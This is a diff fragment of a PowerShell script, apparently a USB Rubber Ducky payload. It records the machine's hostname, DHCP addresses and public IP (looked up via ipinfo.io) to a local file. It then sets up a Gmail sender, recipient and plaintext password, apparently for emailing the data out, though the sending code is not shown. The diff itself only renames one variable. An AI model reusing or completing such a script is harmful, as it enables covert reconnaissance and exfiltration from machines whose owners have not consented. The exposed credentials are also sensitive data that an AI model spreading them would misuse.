@@ -14,7 +14,7 @@ Out-File C:\IT\info.txt -Append -InputObject $a
 $command = {hostname; Get-NetIpaddress | Where PrefixOrigin -EQ DHCP; Invoke-RestMethod http://ipinfo.io/json | Select -exp ip};$command.InvokeReturnAsIs() | Out-File C:\IT\info.txt -Append
 
 
-$FROM = "patitodegoma404@gmail.com"
+$al = "patitodegoma404@gmail.com"
 $PASS = "RubberDucky404!"
 $TO = "patitodegoma404@gmail.com"
 
